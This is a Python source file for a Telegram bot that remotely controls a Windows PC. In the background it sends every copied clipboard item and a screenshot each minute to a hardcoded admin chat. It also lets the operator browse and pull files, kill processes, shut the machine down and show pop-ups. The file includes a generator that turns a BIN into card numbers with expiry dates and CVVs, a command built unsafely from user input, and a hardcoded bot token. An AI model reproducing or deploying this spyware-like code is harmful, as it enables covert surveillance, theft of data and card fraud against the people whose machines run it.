import telebot
from telebot import types
import pyautogui
import pyperclip
import os
import time
import requests
import subprocess
import win32gui
import threading
import webbrowser
import sys
import ctypes
import random
import platform
import base64
import re
import phonenumbers
from phonenumbers import geocoder, carrier, timezone, phonenumberutil
from datetime import datetime

# ==========================================
# 1. إعدادات البوت والمسارات
# ==========================================
TOKEN = "8074252682:AAEVcKbV4oAz4nY44Pin6TnpsRuV8N74nds"
ADMIN_ID = 1431886140

bot = telebot.TeleBot(TOKEN)

# إعدادات المسارات والحفظ
try:
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
except:
    pass

DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop")
SAVE_DIR = os.path.join(DESKTOP_PATH, "محمود")
LOG_FILE = f"Log_{datetime.now().strftime('%Y-%m-%d')}.txt"

if not os.path.exists(SAVE_DIR):
    try: os.makedirs(SAVE_DIR)
    except: pass

# متغيرات النظام
SCREENSHOT_INTERVAL = 60
current_path = os.getcwd()
clipboard_history = []
file_map = {}

# ==========================================
# 2. دوال مساعدة (الأمان والسجل)
# ==========================================
def is_authorized(user_id):
    return user_id == ADMIN_ID

def log_event(text):
    timestamp = datetime.now().strftime("%H:%M:%S")
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f: f.write(f"[{timestamp}] {text}\n")
    except: pass

# ==========================================
# 3. لوحة التحكم الرئيسية (واجهة المستخدم)
# ==========================================
def create_main_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    
    # قسم أدوات الويب والخدمات
    btn_visa = types.KeyboardButton("💳 توليد فيزا")
    btn_phone = types.KeyboardButton("📱 تحليل رقم")
    btn_url = types.KeyboardButton("✂️ اختصار روابط")
    btn_site = types.KeyboardButton("🌐 فحص موقع")
    btn_enc_txt = types.KeyboardButton("📝 تشفير نص")
    btn_enc_file = types.KeyboardButton("🔐 تشفير ملفات")
    
    # قسم التحكم في اللابتوب
    btn_screen = types.KeyboardButton("📸 لقطة شاشة")
    btn_files = types.KeyboardButton("📂 مدير الملفات")
    btn_shutdown = types.KeyboardButton("🔴 إغلاق الجهاز")
    btn_kill = types.KeyboardButton("☠️ قتل برنامج")
    btn_msg = types.KeyboardButton("📩 إرسال رسالة")
    btn_open = types.KeyboardButton("🔗 فتح رابط PC")
    btn_clip = types.KeyboardButton("📋 سجل الحافظة")
    btn_sys = types.KeyboardButton("🖥️ معلومات النظام")
    
    markup.add(btn_visa, btn_phone, btn_url, btn_site, btn_enc_txt, btn_enc_file)
    markup.add(types.KeyboardButton('━━━━━━━━━━━━━━')) # فاصل
    markup.add(btn_screen, btn_files, btn_msg, btn_open, btn_shutdown, btn_kill, btn_clip, btn_sys)
    
    return markup

# ==========================================
# 4. المراقبة التلقائية (Thread Background)
# ==========================================
def automatic_monitor():
    last_window = ""
    last_clipboard = ""
    last_screenshot_time = time.time()
    
    # رسالة بدء التشغيل
    try:
        bot.send_message(ADMIN_ID, 
                         f"🚀 **تم تفعيل نظام التحكم الشامل**\n"
                         f"👤 المستخدم: {os.getlogin()}\n"
                         f"📂 مسار الحفظ: Desktop/محمود", 
                         reply_markup=create_main_keyboard())
    except: pass

    while True:
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            # أ) مراقبة النوافذ النشطة
            try:
                window = win32gui.GetForegroundWindow()
                curr_window = win32gui.GetWindowText(window)
            except: curr_window = ""

            if curr_window and curr_window != last_window:
                # إرسال تنبيه فقط إذا تغيرت النافذة
                # bot.send_message(ADMIN_ID, f"👀 **[نشاط]** {curr_window}") # تم التعطيل لعدم الإزعاج، يمكن تفعيله
                log_event(f"نافذة: {curr_window}")
                last_window = curr_window

            # ب) مراقبة الحافظة
            try:
                curr_clip = pyperclip.paste()
                if curr_clip and curr_clip != last_clipboard:
                    bot.send_message(ADMIN_ID, f"📋 **[تم نسخ نص]**\n{curr_clip}")
                    clipboard_history.append(f"[{timestamp}] {curr_clip}")
                    log_event(f"نسخ: {curr_clip}")
                    last_clipboard = curr_clip
            except: pass

            # ج) لقطة شاشة دورية (كل دقيقة)
            if time.time() - last_screenshot_time > SCREENSHOT_INTERVAL:
                try:
                    shot = "auto_monitor.png"
                    pyautogui.screenshot(shot)
                    with open(shot, 'rb') as f: bot.send_photo(ADMIN_ID, f, caption=f"🔄 Auto: {timestamp}")
                    os.remove(shot)
                except: pass
                last_screenshot_time = time.time()

            time.sleep(1.5)
        except Exception as e:
            time.sleep(5)

# ==========================================
# 5. معالج الأوامر الرئيسية (Dispatcher)
# ==========================================
@bot.message_handler(commands=['start'])
def welcome(message):
    if not is_authorized(message.chat.id): return
    bot.reply_to(message, "👋 أهلاً بك في لوحة القيادة.", reply_markup=create_main_keyboard())

@bot.message_handler(func=lambda m: True)
def handle_all_messages(message):
    if not is_authorized(message.chat.id): return
    text = message.text

    # --- أدوات الويب ---
    if text == "💳 توليد فيزا":
        msg = bot.reply_to(message, "🔢 أرسل الـ BIN (مثال: `484733`):", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_visa)
        
    elif text == "📱 تحليل رقم":
        msg = bot.reply_to(message, "📞 أرسل الرقم مع مفتاح الدولة:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_phone)
        
    elif text == "✂️ اختصار روابط":
        msg = bot.reply_to(message, "🔗 أرسل الرابط الطويل:")
        bot.register_next_step_handler(msg, process_shorten)
        
    elif text == "🌐 فحص موقع":
        msg = bot.reply_to(message, "🌍 أرسل رابط الموقع:")
        bot.register_next_step_handler(msg, process_site_check)
        
    elif text == "📝 تشفير نص":
        msg = bot.reply_to(message, "🔏 أرسل النص للتشفير أو كود Base64 لفك التشفير:")
        bot.register_next_step_handler(msg, process_text_crypto)
        
    elif text == "🔐 تشفير ملفات":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton('تشفير 🔒', callback_data='file_en'),
                   types.InlineKeyboardButton('فك تشفير 🔓', callback_data='file_de'))
        bot.reply_to(message, "اختر العملية:", reply_markup=markup)

    # --- أدوات التحكم في اللابتوب ---
    elif text == "📸 لقطة شاشة":
        take_screenshot(message)
        
    elif text == "📂 مدير الملفات":
        open_file_manager(message)
        
    elif text == "🔴 إغلاق الجهاز":
        bot.reply_to(message, "⚠️ سيتم إغلاق الجهاز خلال 5 ثواني...")
        os.system("shutdown /s /t 5")
        
    elif text == "☠️ قتل برنامج":
        msg = bot.reply_to(message, "اسم البرنامج (مثال: chrome.exe):")
        bot.register_next_step_handler(msg, lambda m: os.system(f"taskkill /f /im {m.text}") and bot.reply_to(m, "تم التنفيذ."))
        
    elif text == "📩 إرسال رسالة":
        msg = bot.reply_to(message, "💬 اكتب الرسالة لتظهر على الشاشة:")
        bot.register_next_step_handler(msg, show_popup_message)
        
    elif text == "🔗 فتح رابط PC":
        msg = bot.reply_to(message, "🔗 الرابط لفتحه في المتصفح:")
        bot.register_next_step_handler(msg, lambda m: webbrowser.open(m.text) and bot.reply_to(m, "✅ تم الفتح."))
        
    elif text == "📋 سجل الحافظة":
        content = "\n".join(clipboard_history[-15:]) if clipboard_history else "السجل فارغ"
        bot.reply_to(message, f"📋 **آخر المنسوخات:**\n{content}", parse_mode="Markdown")
        
    elif text == "🖥️ معلومات النظام":
        info = (f"💻 **System:** {platform.system()} {platform.release()}\n"
                f"👤 **User:** {os.getlogin()}\n"
                f"🏛️ **CPU:** {platform.processor()}\n"
                f"📍 **IP Info:** {get_ip_info()}")
        bot.reply_to(message, info, parse_mode="Markdown")
        
    elif text == '━━━━━━━━━━━━━━':
        pass # زر فاصل لا يفعل شيء
    else:
        bot.reply_to(message, "🤔 أمر غير معروف، اختر من القائمة.", reply_markup=create_main_keyboard())

# ==========================================
# 6. دوال المنطق (Logic Functions)
# ==========================================

# --- دوال التحكم في اللابتوب ---
def take_screenshot(message):
    try:
        shot = "manual_shot.png"
        pyautogui.screenshot(shot)
        with open(shot, 'rb') as f: bot.send_photo(message.chat.id, f)
        os.remove(shot)
    except: bot.reply_to(message, "❌ فشل التقاط الصورة")

def show_popup_message(message):
    text = message.text
    threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, text, "رسالة من الأدمن", 0x40 | 0x1000)).start()
    bot.reply_to(message, f"✅ تم إظهار الرسالة:\n{text}")

def get_ip_info():
    try:
        r = requests.get("http://ip-api.com/json/").json()
        return f"{r['country']} - {r['city']}"
    except: return "غير متاح"

# --- دوال أدوات الويب ---
def process_visa(message):
    try:
        bin_val = message.text.strip()
        results = []
        for _ in range(10):
            rand = ''.join([str(random.randint(0,9)) for _ in range(10)])
            card = f"`{bin_val[:6]}{rand}|{random.randint(1,12):02d}|{random.randint(2025,2030)}|{random.randint(100,999)}`"
            results.append(card)
        bot.reply_to(message, "✅ **تم التوليد:**\n" + "\n".join(results), parse_mode="Markdown")
    except: bot.reply_to(message, "❌ حدث خطأ")

def process_phone(message):
    try:
        parsed = phonenumbers.parse(message.text, None)
        country = geocoder.description_for_number(parsed, "ar")
        provider = carrier.name_for_number(parsed, "ar")
        valid = phonenumbers.is_valid_number(parsed)
        bot.reply_to(message, f"🔎 **التقرير:**\n🌍 الدولة: {country}\n🏢 الشركة: {provider}\n✅ صالح: {valid}", parse_mode="Markdown")
    except: bot.reply_to(message, "❌ رقم غير صحيح")

def process_shorten(message):
    try:
        url = f'https://is.gd/create.php?format=simple&url={message.text}'
        bot.reply_to(message, f"✅ **الرابط المختصر:**\n{requests.get(url).text}", parse_mode="Markdown")
    except: bot.reply_to(message, "❌ فشل الاختصار")

def process_site_check(message):
    url = message.text if message.text.startswith('http') else 'https://' + message.text
    try:
        st = time.time()
        res = requests.get(url, timeout=5)
        bot.reply_to(message, f"✅ **الحالة:** {res.status_code}\n⚡ **الوقت:** {round(time.time()-st, 2)}s", parse_mode="Markdown")
    except: bot.reply_to(message, "❌ الموقع لا يستجيب")

def process_text_crypto(message):
    try:
        # محاولة فك التشفير
        decoded = base64.b64decode(message.text).decode('utf-8')
        bot.reply_to(message, f"🔓 **فك تشفير:**\n`{decoded}`", parse_mode="Markdown")
    except:
        # التشفير
        encoded = base64.b64encode(message.text.encode('utf-8')).decode('utf-8')
        bot.reply_to(message, f"🔐 **تشفير:**\n`{encoded}`", parse_mode="Markdown")

# ==========================================
# 7. مدير الملفات (File Manager Logic)
# ==========================================
def get_file_keyboard(path):
    global file_map
    file_map = {} 
    markup = types.InlineKeyboardMarkup()
    try:
        items = os.listdir(path)
        folders = [f for f in items if os.path.isdir(os.path.join(path, f))]
        files = [f for f in items if os.path.isfile(os.path.join(path, f))]
        
        markup.add(types.InlineKeyboardButton("⬆️ ...خلف", callback_data="CD_UP"))
        
        for i, folder in enumerate(folders[:8]): 
            file_key = f"DIR_{i}"
            file_map[file_key] = folder 
            markup.add(types.InlineKeyboardButton(f"📁 {folder}", callback_data=file_key))
            
        for i, file in enumerate(files[:8]):
            file_key = f"FILE_{i}"
            file_map[file_key] = file
            markup.add(types.InlineKeyboardButton(f"📄 {file}", callback_data=file_key))
    except: pass
    return markup

def open_file_manager(message):
    global current_path
    if not current_path: current_path = os.getcwd()
    bot.send_message(message.chat.id, f"📂 `{current_path}`", parse_mode="Markdown", reply_markup=get_file_keyboard(current_path))

# ==========================================
# 8. معالجة الملفات والـ Callbacks
# ==========================================
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    global current_path
    
    # -- معالجة تشفير الملفات --
    if call.data == 'file_en':
        msg = bot.send_message(call.message.chat.id, "📂 أرسل الملف لتشفيره:")
        bot.register_next_step_handler(msg, file_encrypt_step)
        return
    elif call.data == 'file_de':
        msg = bot.send_message(call.message.chat.id, "📂 أرسل الملف لفك تشفيره:")
        bot.register_next_step_handler(msg, file_decrypt_step)
        return

    # -- معالجة مدير الملفات --
    if call.data == "CD_UP":
        current_path = os.path.dirname(current_path)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
            text=f"📂 `{current_path}`", parse_mode="Markdown", reply_markup=get_file_keyboard(current_path))

    elif call.data in file_map:
        real_name = file_map[call.data]
        if call.data.startswith("DIR_"):
            current_path = os.path.join(current_path, real_name)
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=f"📂 `{current_path}`", parse_mode="Markdown", reply_markup=get_file_keyboard(current_path))
        
        elif call.data.startswith("FILE_"):
            file_path = os.path.join(current_path, real_name)
            bot.answer_callback_query(call.id, "جاري الرفع...")
            try:
                with open(file_path, 'rb') as f: bot.send_document(call.message.chat.id, f)
            except Exception as e:
                bot.send_message(call.message.chat.id, f"❌ خطأ: {e}")

# خطوات تشفير الملفات
def file_encrypt_step(message):
    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded = bot.download_file(file_info.file_path)
            encoded = base64.b64encode(downloaded)
            bot.send_document(message.chat.id, encoded, caption="✅ ملف مشفر")
        except: bot.reply_to(message, "❌ خطأ")
    else: bot.reply_to(message, "❌ لم يتم إرسال ملف")

def file_decrypt_step(message):
    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded = bot.download_file(file_info.file_path)
            decoded = base64.b64decode(downloaded)
            bot.send_document(message.chat.id, decoded, caption="✅ ملف مفكوك")
        except: bot.reply_to(message, "❌ الملف تالف أو غير مشفر")
    else: bot.reply_to(message, "❌ لم يتم إرسال ملف")

# ==========================================
# 9. استقبال الملفات العادية (الحفظ في الجهاز)
# ==========================================
@bot.message_handler(content_types=['document', 'photo', 'video', 'audio'])
def handle_regular_files(message):
    if not is_authorized(message.chat.id): return
    
    # ملاحظة: إذا كان المستخدم في خطوة تشفير، سيعالجها "next_step_handler" أولاً
    # هذا الهاندلر يعمل فقط إذا لم يكن هناك خطوة معلقة (أي حفظ مباشر)
    
    try:
        bot.reply_to(message, "📥 جاري حفظ الملف على الجهاز...")
        
        if message.content_type == 'document':
            file_name = message.document.file_name
            file_id = message.document.file_id
        elif message.content_type == 'photo':
            file_name = f"img_{int(time.time())}.jpg"
            file_id = message.photo[-1].file_id
        else:
            file_name = f"file_{int(time.time())}"
            file_id = getattr(message, message.content_type).file_id

        file_info = bot.get_file(file_id)
        downloaded = bot.download_file(file_info.file_path)
        
        save_path = os.path.join(SAVE_DIR, file_name)
        with open(save_path, 'wb') as f: f.write(downloaded)
        
        bot.reply_to(message, f"✅ تم الحفظ في: `Desktop/محمود/{file_name}`", parse_mode="Markdown")
        log_event(f"استقبال ملف: {file_name}")
        
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {e}")

# ==========================================
# 10. التشغيل النهائي
# ==========================================
if __name__ == "__main__":
    # تشغيل خيط المراقبة في الخلفية
    t = threading.Thread(target=automatic_monitor)
    t.daemon = True
    t.start()
    
    print("🤖 All-in-One Bot Started...")
    # تشغيل البوت
    while True:
        try:
            bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except Exception as e:
            time.sleep(5)